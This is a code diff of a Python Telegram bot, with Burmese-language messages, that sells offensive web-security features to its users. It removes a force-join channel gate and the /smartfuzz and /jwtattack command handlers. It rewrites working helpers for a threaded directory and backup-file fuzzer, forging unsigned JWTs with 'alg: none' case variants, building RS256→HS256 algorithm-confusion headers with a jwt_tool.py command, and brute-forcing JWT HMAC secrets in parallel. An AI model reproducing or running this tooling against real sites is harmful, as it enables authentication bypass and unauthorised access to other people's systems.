-                icon = st_icons.get(item["status"], f"⚙️")
-                path = item["url"].replace(base_url, "")
-                lines.append(
-                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
-                )
-            lines.append("")
-
-        if normal:
-            lines.append(f"*🟡 Interesting ({len(normal)}):*")
-            for item in normal[:20]:
-                icon = st_icons.get(item["status"], f"⚙️")
-                path = item["url"].replace(base_url, "")
-                lines.append(
-                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
-                )
-            if len(normal) > 20:
-                lines.append(f"  _…{len(normal)-20} more in report_")
-
-    lines.append("\n⚠️ _Passive fuzzing. No exploitation._")
-
-    # ── Always export JSON report ──────────────────
-    import io as _io
-    report = json.dumps({
-        "target": url, "mode": mode, "domain": domain,
-        "scanned_at": datetime.now().isoformat(),
-        "baseline_status": baseline_st,
-        "wordlist_size": len(wordlist),
-        "findings_count": len(found),
-        "findings": [{
-            "url":    r["url"],
-            "path":   r["url"].replace(base_url,""),
-            "status": r["status"],
-            "size":   r["size"],
-            "content_type": r["ct"],
-            "high_risk": any(w in r["url"].lower() for w in risk_words.get(mode,[])),
-        } for r in found],
-    }, indent=2)
-
-    tg_text = "\n".join(lines)
-    try:
-        await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
-    except Exception:
-        pass
-
-    buf = _io.BytesIO(report.encode())
-    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    await context.bot.send_document(
-        chat_id=update.effective_chat.id,
-        document=buf,
-        filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
-        caption=(
-            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
-            f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
-            f"Wordlist: `{len(wordlist)}` entries"
-        ),
-        parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════
-# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
-# ══════════════════════════════════════════════════
-# DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
-# Admin IDs always bypass — no check needed.
-
-async def _get_force_channels(db: dict) -> list:
-    return db.get("settings", {}).get("force_channels", [])
-
-async def check_force_join(update: Update, context) -> bool:
-    """
-    Returns True if user is allowed to proceed.
-    Admin always passes. Regular users must be member of all force channels.
-    """
-    uid = update.effective_user.id
-    if uid in ADMIN_IDS:
-        return True  # Admin — always free
-
-    async with db_lock:
-        db = _load_db_sync()
-    channels = await _get_force_channels(db)
-    if not channels:
-        return True  # No force join configured — allow all
-
-    not_joined = []
-    for ch in channels:
-        try:
-            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
-            if member.status in ("left", "kicked", "banned"):
-                not_joined.append(ch)
-        except Exception:
-            not_joined.append(ch)
-
-    if not not_joined:
-        return True
-
-    # Build join buttons
-    kb = []
-    for ch in not_joined:
-        label = ch if ch.startswith('@') else f"Channel"
-        invite_link = ch if ch.startswith('@') else ch
-        kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
-    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
-
-    await update.effective_message.reply_text(
-        "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
-        "အောက်ပါ Channel(s) ကို Join ပြီးမှ ဆက်လုပ်ပါ:\n\n"
-        + "\n".join(f"  • {ch}" for ch in not_joined),
-        reply_markup=InlineKeyboardMarkup(kb),
-        parse_mode='Markdown'
-    )
-    return False
-
-
-async def force_join_callback(update: Update, context) -> None:
-    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
-    query = update.callback_query
-    await query.answer()
-    uid = query.from_user.id
-
-    async with db_lock:
-        db = _load_db_sync()
-    channels = await _get_force_channels(db)
-
-    not_joined = []
-    for ch in channels:
-        try:
-            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
-            if member.status in ("left", "kicked", "banned"):
-                not_joined.append(ch)
-        except Exception:
-            not_joined.append(ch)
-
-    if not not_joined:
-        try:
-            await query.edit_message_text(
-                "✅ *စစ်ဆေးမှု အောင်မြင်ပါပြီ!*\n\n"
-                "Bot ကို အခုသုံးလို့ ရပါပြီ 🎉\n"
-                "/start ကို နှိပ်ပါ",
-                parse_mode='Markdown'
-            )
-        except BadRequest:
-            pass  # Message already same content — ignore
-    else:
-        kb = []
-        for ch in not_joined:
-            kb.append([InlineKeyboardButton(
-                f"📢 {ch} ကို Join လုပ်ပါ",
-                url=f"https://t.me/{ch.lstrip('@')}"
-            )])
-        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
-        new_text = (
-            "❌ *မပြည့်စုံသေးပါ*\n\n"
-            "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
-            + "\n".join(f"  • {ch}" for ch in not_joined)
-        )
-        try:
-            await query.edit_message_text(
-                new_text,
-                reply_markup=InlineKeyboardMarkup(kb),
-                parse_mode='Markdown'
-            )
-        except BadRequest:
-            # Message not modified (same channels) — just answer silently
-            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)
-
-
-async def appassets_cat_callback(update: Update, context) -> None:
-    """Callback for /appassets category selection buttons."""
-    query = update.callback_query
-    await query.answer()
-    uid  = query.from_user.id
-    data = query.data  # apa_images / apa_all / etc.
-
-    cat = data[4:]  # strip "apa_"
-    valid_cats = set(_ASSET_CATEGORIES.keys())
-
-    if cat == "all":
-        wanted_cats = valid_cats.copy()
-    elif cat in valid_cats:
-        wanted_cats = {cat}
-    else:
-        try: await query.edit_message_text("❌ Unknown category")
-        except BadRequest: pass
-        return
-
-    async with db_lock:
-        db = _load_db_sync()
-    u = get_user(db, uid)
-    last_app = u.get("last_uploaded_app")
-
-    if not last_app or not os.path.exists(last_app):
-        try:
-            await query.edit_message_text(
-                "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
-            )
-        except BadRequest: pass
-        return
-
-    try:
-        await query.edit_message_text(
-            f"📦 Extracting `{', '.join(sorted(wanted_cats))}` from "
-            f"`{os.path.basename(last_app)}`...\n⏳"
-        )
-    except BadRequest:
-        pass
-
-    # Use query.message as message target — send new reply
-    await _do_appassets_extract(query.message, context, last_app, wanted_cats)
-
-
-@admin_only
-async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/setforcejoin @channel1 @channel2 ... | /setforcejoin off"""
-    if not context.args:
-        async with db_lock:
-            db = _load_db_sync()
-        chs = await _get_force_channels(db)
-        await update.effective_message.reply_text(
-            "📢 *Force Join Settings*\n\n"
-            f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
-            "Usage:\n"
-            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
-            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
-            "`/setforcejoin off` — ပိတ်မည်\n\n"
-            "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
-            parse_mode='Markdown'
-        )
-        return
-
-    async with db_lock:
-        db = _load_db_sync()
-        if context.args[0].lower() == "off":
-            db["settings"]["force_channels"] = []
-            _save_db_sync(db)
-            await update.effective_message.reply_text("✅ Force Join ပိတ်လိုက်ပါပြီ")
-            return
-        channels = [a if a.startswith('@') else '@' + a for a in context.args]
-        db["settings"]["force_channels"] = channels
-        _save_db_sync(db)
-
-    await update.effective_message.reply_text(
-        f"✅ *Force Join set လုပ်ပြီး*\n\n"
-        f"Channels: {', '.join(f'`{c}`' for c in channels)}\n\n"
-        "Users တွေ join မလုပ်ရင် Bot သုံးခွင့် မရတော့ပါ\n"
-        "⚠️ Bot ကို အဆိုပါ channel(s) မှာ admin အဖြစ် ထည့်ထားဖို့ မမေ့နဲ့",
-        parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════
-# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
-# ══════════════════════════════════════════════════
 
 _ASSET_CATEGORIES = {
     "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
@@ -5229,50 +4632,76 @@ def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
 
 
 def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
-    """Probe all wordlist entries against target."""
+    """Probe wordlist + backup ext variants + response diff."""
     found = []
 
-    # Baseline fingerprint
     try:
         r404 = requests.get(
-            base_url.rstrip('/') + '/xyznotfound_abc123_never_exists',
-            proxies=proxy_manager.get_proxy(), timeout=6, verify=False, headers=_get_headers()
+            base_url.rstrip("/") + "/xyznotfound_abc123_never_exists",
+            proxies=proxy_manager.get_proxy(),
+            timeout=6, verify=False, headers=_get_headers()
         )
         baseline_status = r404.status_code
         baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
         baseline_size   = len(r404.content)
+        baseline_words  = len(r404.text.split()) if r404.text else 0
     except Exception:
-        baseline_status, baseline_hash, baseline_size = 404, '', 0
+        baseline_status, baseline_hash, baseline_size, baseline_words = 404, "", 0, 0
+
+    # Expand wordlist with backup extensions
+    expanded = list(wordlist)
+    for word in wordlist[:50]:
+        for ext in [".bak", ".old", ".swp", "~", ".orig"]:
+            expanded.append(word.rstrip("/") + ext)
 
     def _probe(word):
-        target = base_url.rstrip('/') + '/' + word.lstrip('/')
+        target = base_url.rstrip("/") + "/" + word.lstrip("/")
         try:
-            r = requests.get(target, timeout=5, verify=False, headers=_get_headers(),
-                             proxies=proxy_manager.get_proxy(), allow_redirects=True, stream=True)
-            chunk = b''
-            for part in r.iter_content(512):
+            r = requests.get(
+                target, timeout=5, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy(),
+                allow_redirects=True, stream=True
+            )
+            chunk = b""
+            for part in r.iter_content(1024):
                 chunk += part
-                if len(chunk) >= 512: break
+                if len(chunk) >= 1024:
+                    break
             r.close()
-            r_hash = hashlib.md5(chunk[:512]).hexdigest()
-            r_size = len(chunk)
-            # Filter baseline catch-all
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_size  = len(chunk)
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
             if r.status_code == baseline_status:
-                if r_hash == baseline_hash: return None
-                if baseline_size > 0 and abs(r_size - baseline_size) < 30: return None
+                if r_hash == baseline_hash:
+                    return None
+                if baseline_size > 0 and abs(r_size - baseline_size) < 30:
+                    return None
+                if baseline_words > 0 and abs(r_words - baseline_words) < 5:
+                    return None
+
             if r.status_code in (200, 201, 301, 302, 401, 403, 500):
-                return {"url": target, "word": word, "status": r.status_code, "size": r_size}
+                return {
+                    "url":    target,
+                    "word":   word,
+                    "status": r.status_code,
+                    "size":   r_size,
+                    "gated":  r.status_code in (401, 403),
+                }
         except Exception:
             pass
         return None
 
     done = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
-        fmap = {ex.submit(_probe, w): w for w in wordlist}
-        for fut in concurrent.futures.as_completed(fmap, timeout=120):
+        fmap = {ex.submit(_probe, w): w for w in expanded}
+        for fut in concurrent.futures.as_completed(fmap, timeout=150):
             done += 1
-            if progress_cb and done % 30 == 0:
-                progress_cb(f"🧪 Fuzzing: `{done}/{len(wordlist)}` | Found: `{len(found)}`")
+            if progress_cb and done % 40 == 0:
+                progress_cb(
+                    f"🧪 Fuzzing: `{done}/{len(expanded)}` | "
+                    f"Found: `{len(found)}` (incl. gated)"
+                )
             try:
                 res = fut.result(timeout=6)
                 if res:
@@ -5280,190 +4709,19 @@ def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> li
             except Exception:
                 pass
 
-    found.sort(key=lambda x: (x['status'] != 200, x['status']))
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
     return found
 
 
-async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
-    if not await check_force_join(update, context):
-        return
-
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
-            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
-            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
-            "   Company name, product name, developer identifiers,\n"
-            "   JS variables, class/ID names, meta keywords\n"
-            "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
-            "② *Wordlist Generation* (CeWL-style)\n"
-            "   ရလာတဲ့ words တွေကို backup/year/suffix combos\n"
-            "   နဲ့ permutate လုပ်ပြီး custom dictionary ဆောက်ပါမည်\n"
-            "   Example: `companyname_backup_2025.zip`\n\n"
-            "③ *Smart Fuzzing*\n"
-            "   Custom wordlist ဖြင့် target ကို probe လုပ်ပြီး\n"
-            "   Baseline fingerprinting ဖြင့် false-positive စစ်ပါမည်\n\n"
-            "📦 Wordlist + Results ကို export ပေးမည်\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).netloc
-    # Full URL path preserved — do not strip to root
-    _pu = urlparse(url)
-    _dir = _pu.path.rsplit("/", 1)[0].rstrip("/") + "/" if "/" in _pu.path else "/"
-    base_url = f"{_pu.scheme}://{_pu.netloc}{_dir}"
-    msg = await update.effective_message.reply_text(
-        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
-        "① Harvesting words from target...\n"
-        "② Building custom wordlist...\n"
-        "③ Fuzzing...\n\n⏳",
-        parse_mode='Markdown'
-    )
-
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🗂️ *SmartFuzz — `{domain}`*\n\n{txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        wordlist, raw_words = await asyncio.to_thread(
-            _build_context_wordlist, url, lambda t: progress_q.append(t)
-        )
-        if not wordlist:
-            prog.cancel()
-            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
-            return
-
-        progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
-        found = await asyncio.to_thread(
-            _smartfuzz_probe_sync, base_url, wordlist,
-            lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    # ── Summary ───────────────────────────────────
-    hits_200   = [f for f in found if f['status'] == 200]
-    hits_auth  = [f for f in found if f['status'] in (401, 403)]
-    hits_redir = [f for f in found if f['status'] in (301, 302)]
-    hits_err   = [f for f in found if f['status'] == 500]
-
-    lines = [
-        f"🗂️ *SmartFuzz Results — `{domain}`*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"📝 Words scraped: `{len(raw_words)}`",
-        f"🎯 Wordlist generated: `{len(wordlist)}`",
-        f"🔍 Total probed: `{len(wordlist)}`",
-        f"✅ Found: `{len(found)}` interesting",
-        "",
-    ]
-
-    if hits_200:
-        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
-        for h in hits_200[:15]:
-            lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
-        lines.append("")
-
-    if hits_auth:
-        lines.append(f"*🔒 Protected 401/403 ({len(hits_auth)}):*")
-        for h in hits_auth[:10]:
-            lines.append(f"  🔐 `/{h['word']}` [{h['status']}]")
-        lines.append("")
-
-    if hits_redir:
-        lines.append(f"*↩️ Redirects ({len(hits_redir)}):*")
-        for h in hits_redir[:5]:
-            lines.append(f"  ↪ `/{h['word']}` [{h['status']}]")
-        lines.append("")
-
-    if hits_err:
-        lines.append(f"*⚠️ Server Errors 500 ({len(hits_err)}):*")
-        for h in hits_err[:5]:
-            lines.append(f"  🔴 `/{h['word']}`")
-        lines.append("")
-
-    if not found:
-        lines.append("📭 _Interesting paths မတွေ့ပါ_")
-
-    lines.append("⚠️ _Authorized testing only_")
-
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-    # ── Export wordlist + results as ZIP ─────────
-    import io, zipfile as _zf
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    zip_buf = io.BytesIO()
-
-    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
-        zf.writestr("wordlist.txt", "\n".join(wordlist))
-        zf.writestr("raw_words.txt", "\n".join(sorted(raw_words)))
-        result_lines = [f"{f['status']}\t{f['url']}\t{f['size']}B" for f in found]
-        zf.writestr("results.txt", "\n".join(result_lines) or "No results")
-        zf.writestr("results.json", json.dumps({
-            "domain": domain, "scanned_at": datetime.now().isoformat(),
-            "wordlist_size": len(wordlist), "raw_words": len(raw_words),
-            "found": found
-        }, indent=2))
-
-    zip_buf.seek(0)
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=zip_buf,
-            filename=f"smartfuzz_{safe_d}_{ts}.zip",
-            caption=(
-                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
-                f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
-                "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
-            ),
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.warning("SmartFuzz export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
-# ══════════════════════════════════════════════════
+# ───────────────────────────────────────────────────────────────────
+# [4] REPLACE _endpoints_sync (original: line ~8865)
+#     IMPROVEMENTS:
+#       + Fetch /swagger.json /openapi.yaml /api-docs /redoc
+#       + GraphQL introspection query (types list)
+#       + Parse Next.js _buildManifest.js for route list
+#       + gRPC-web content-type detection
+#       + Group /v1 /v2 /v3 side-by-side in results
+# ───────────────────────────────────────────────────────────────────
 
 import base64 as _b64
 
@@ -5498,59 +4756,67 @@ def _jwt_decode_payload(token: str) -> dict:
 
 
 def _jwt_none_attack(token: str) -> dict:
-    """None algorithm bypass — forge unsigned token."""
-    parts = token.split('.')
+    """None algorithm bypass — also try 'NONE', 'None' variants."""
+    parts = token.split(".")
     if len(parts) != 3:
         return {"success": False}
     try:
-        header_dec = _jwt_decode_payload(token)["header"]
-        orig_alg   = header_dec.get("alg", "HS256")
-        forged_header = dict(header_dec)
-        forged_header["alg"] = "none"
-        def _b64e(d: dict) -> str:
-            return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
-        forged = f"{_b64e(forged_header)}.{parts[1]}."
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False, "error": dec["error"]}
+        orig_alg = dec["header"].get("alg", "HS256")
+
+        variants = []
+        for alg_val in ("none", "None", "NONE", "nOnE"):
+            h = {**dec["header"], "alg": alg_val}
+            variants.append(f"{_b64url_encode(h)}.{parts[1]}.")
+
         return {
-            "success": True,
+            "success":      True,
             "original_alg": orig_alg,
-            "forged_token":  forged,
-            "method": "none_alg_bypass",
-            "note": "Signature removed — send with empty sig. Some servers accept this."
+            "forged_tokens": variants,
+            "method":       "none_alg_bypass",
+            "note":         "Try all 4 case variants — some servers check case-insensitively.",
         }
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
 def _jwt_alg_confusion(token: str) -> dict:
-    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
-    parts = token.split('.')
+    """RS256 → HS256 algorithm confusion attack."""
+    parts = token.split(".")
     if len(parts) != 3:
         return {"success": False}
     try:
-        header_dec = _jwt_decode_payload(token)["header"]
-        orig_alg   = header_dec.get("alg", "HS256")
-        if orig_alg == "RS256":
-            confused = dict(header_dec)
-            confused["alg"] = "HS256"
-            def _b64e(d: dict) -> str:
-                return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
-            confused_header = _b64e(confused)
-            note = (
-                "RS256→HS256 confusion: Change alg to HS256 then sign with public key as secret.\n"
-                "Tool: python-jwt or jwt_tool.py\n"
-                "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
-            )
-            return {"success": True, "original_alg": "RS256", "target_alg": "HS256",
-                    "confused_header": confused_header, "method": "alg_confusion", "note": note}
-        return {"success": False, "note": f"Alg is `{orig_alg}` (RS256 only for this attack)"}
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False}
+        orig_alg = dec["header"].get("alg", "HS256")
+        if orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384"):
+            confused = {**dec["header"], "alg": "HS256"}
+            return {
+                "success":         True,
+                "original_alg":    orig_alg,
+                "target_alg":      "HS256",
+                "confused_header": _b64url_encode(confused),
+                "method":          "alg_confusion",
+                "note": (
+                    f"{orig_alg}→HS256 confusion: Change alg to HS256 then sign with "
+                    "the server's public key as the HMAC secret.\n"
+                    "Tool: jwt_tool.py\n"
+                    "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
+                ),
+            }
+        return {"success": False, "note": f"Alg is `{orig_alg}` (RS/ES256 needed)"}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
 def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
-    """Brute-force JWT HMAC secret from wordlist."""
+    """Parallel HMAC brute-force — significantly faster than sequential."""
     import hmac as _hmac
-    parts = token.split('.')
+
+    parts = token.split(".")
     if len(parts) != 3:
         return {"cracked": False, "error": "Invalid JWT"}
 
@@ -5559,346 +4825,238 @@ def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dic
         "HS384": hashlib.sha384,
         "HS512": hashlib.sha512,
     }
-
-    # Detect algorithm
     header_info = _jwt_decode_payload(token).get("header", {})
     alg = header_info.get("alg", "HS256")
     if alg not in target_algs:
-        return {"cracked": False, "error": f"Algorithm `{alg}` not brute-forceable (needs HMAC)"}
+        return {"cracked": False, "error": f"Algorithm `{alg}` not HMAC-brute-forceable"}
 
     hash_fn   = target_algs[alg]
     msg_bytes = f"{parts[0]}.{parts[1]}".encode()
-
-    # Decode target signature
-    sig_pad = parts[2].replace('-', '+').replace('_', '/')
-    sig_pad += '=' * (-len(sig_pad) % 4)
+    sig_pad   = parts[2].replace("-", "+").replace("_", "/")
+    sig_pad  += "=" * (-len(sig_pad) % 4)
     try:
         target_sig = _b64.b64decode(sig_pad)
     except Exception:
         return {"cracked": False, "error": "Cannot decode signature"}
 
-    wl = wordlist or _JWT_COMMON_SECRETS
+    wl    = wordlist or _JWT_COMMON_SECRETS
     total = len(wl)
+    found = [None]  # shared result
 
-    for i, secret in enumerate(wl):
-        if progress_cb and i % 50 == 0:
-            progress_cb(f"🔑 Brute-force: `{i}/{total}` tried")
-        try:
-            computed = _hmac.HMAC(secret.encode(), msg_bytes, hash_fn).digest()
-            if computed == target_sig:
-                return {"cracked": True, "secret": secret, "alg": alg, "tried": i + 1}
-        except Exception:
-            continue
+    def _try_batch(secrets):
+        for secret in secrets:
+            if found[0]:
+                return
+            try:
+                computed = _hmac.new(secret.encode(), msg_bytes, hash_fn).digest()
+                if computed == target_sig:
+                    found[0] = secret
+                    return
+            except Exception:
+                pass
 
+    # Split into batches for parallel workers
+    batch_size = max(1, total // 8)
+    batches    = [wl[i:i + batch_size] for i in range(0, total, batch_size)]
+    done_count = [0]
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        futures = [ex.submit(_try_batch, b) for b in batches]
+        for fut in concurrent.futures.as_completed(futures):
+            done_count[0] += 1
+            if progress_cb:
+                tried = min(done_count[0] * batch_size, total)
+                progress_cb(f"🔑 Brute-force: `{tried}/{total}` | Workers: 8")
+            if found[0]:
+                for f in futures:
+                    f.cancel()
+                break
+
+    if found[0]:
+        return {"cracked": True, "secret": found[0], "alg": alg,
+                "tried": wl.index(found[0]) + 1}
     return {"cracked": False, "tried": total, "alg": alg}
 
 
-async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
-    if not await check_force_join(update, context):
-        return
+# ───────────────────────────────────────────────────────────────────
+# [3] REPLACE _fuzz_sync + _smartfuzz_probe_sync + _build_context_wordlist
+#     (original: lines ~4252 / 5108 / 5231)
+#     IMPROVEMENTS:
+#       + Tech-aware wordlist selection (_detect_tech_stack)
+#       + Backup extension scan (.bak .old .orig .swp ~)
+#       + Parameter fuzzing with debug/injection values
+#       + Response body diff fingerprinting (not just size/hash)
+#       + 401/403 → "gated" flag distinct from "exposed"
+# ───────────────────────────────────────────────────────────────────
 
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/jwtattack <token>`\n\n"
-            "🎟️ *JWT Attack Phases:*\n\n"
-            "① *Decode* — Header + Payload reveal\n"
-            "   Algorithm, expiry, user roles, claims\n\n"
-            "② *None Algorithm Bypass*\n"
-            "   `alg: none` — unsigned token forge\n\n"
-            "③ *Algorithm Confusion*\n"
-            "   RS256 → HS256 confusion attack\n\n"
-            "④ *Secret Key Brute-force*\n"
-            f"   `{len(_JWT_COMMON_SECRETS)}` common secrets + dictionary\n\n"
-            "💡 `/extract <url>` နဲ့ token ရှာပြီး ဒီမှာ paste ပါ",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    token = context.args[0].strip()
-
-    # URL pass လုပ်မိရင် ကောင်းကောင်း error ပြ
-    if token.startswith('http://') or token.startswith('https://'):
-        await update.effective_message.reply_text(
-            "❌ *URL မဟုတ်ဘဲ JWT Token ထည့်ပါ*\n\n"
-            "JWT format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx`\n\n"
-            "💡 Token ကိုရှာဖို့ `/extract <url>` သုံးနိုင်သည်",
-            parse_mode='Markdown'
-        )
-        return
-
-    # Basic JWT format check (3 parts, each part is base64url)
-    if token.count('.') != 2:
-        await update.effective_message.reply_text(
-            "❌ Valid JWT မဟုတ်ပါ\n"
-            "JWT format: `xxxxx.yyyyy.zzzzz` (dot 3 ပိုင်း ပါရမည်)",
-            parse_mode='Markdown'
-        )
-        return
-
-    parts = token.split('.')
-    for i, part in enumerate(parts[:2]):
-        if len(part) < 4:
-            await update.effective_message.reply_text(
-                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
-                parse_mode='Markdown'
-            )
-            return
-
-    msg = await update.effective_message.reply_text(
-        "🎟️ *JWT Attacker Running...*\n\n"
-        "① Decoding...\n② None attack...\n③ Alg confusion...\n④ Brute-forcing...\n⏳",
-        parse_mode='Markdown'
-    )
-
-    # ── Phase 1: Decode ──────────────────────────
-    decoded = _jwt_decode_payload(token)
-    if "error" in decoded:
-        await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
-        return
-
-    header  = decoded.get("header", {})
-    payload = decoded.get("payload", {})
-    alg     = header.get("alg", "unknown")
-
-    # Format payload nicely
-    def _fmt_payload(p: dict) -> str:
-        lines = []
-        important_keys = ['sub','iss','aud','exp','iat','nbf','role','roles',
-                          'user_id','uid','email','username','admin','scope',
-                          'permissions','type','jti']
-        for k in important_keys:
-            if k in p:
-                v = p[k]
-                if k in ('exp','iat','nbf') and isinstance(v, int):
-                    try:
-                        from datetime import datetime as _dt
-                        v = f"{v} ({_dt.utcfromtimestamp(v).strftime('%Y-%m-%d %H:%M UTC')})"
-                    except Exception:
-                        pass
-                lines.append(f"  `{k}`: `{str(v)[:80]}`")
-        remaining = {k: v for k, v in p.items() if k not in important_keys}
-        for k, v in list(remaining.items())[:10]:
-            lines.append(f"  `{k}`: `{str(v)[:60]}`")
-        return "\n".join(lines) or "  (empty)"
-
-    payload_str = _fmt_payload(payload)
-
-    # ── Phase 2: None attack ─────────────────────
-    none_res = _jwt_none_attack(token)
-
-    # ── Phase 3: Alg confusion ───────────────────
-    alg_res = _jwt_alg_confusion(token)
-
-    # ── Phase 4: Brute-force (in thread) ─────────
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🎟️ *JWT Attacker*\n\n🔑 {txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        bf_res = await asyncio.to_thread(
-            _jwt_brute_force, token, None, lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        bf_res = {"cracked": False, "error": str(e)}
-    finally:
-        prog.cancel()
-
-    # ── Build report ─────────────────────────────
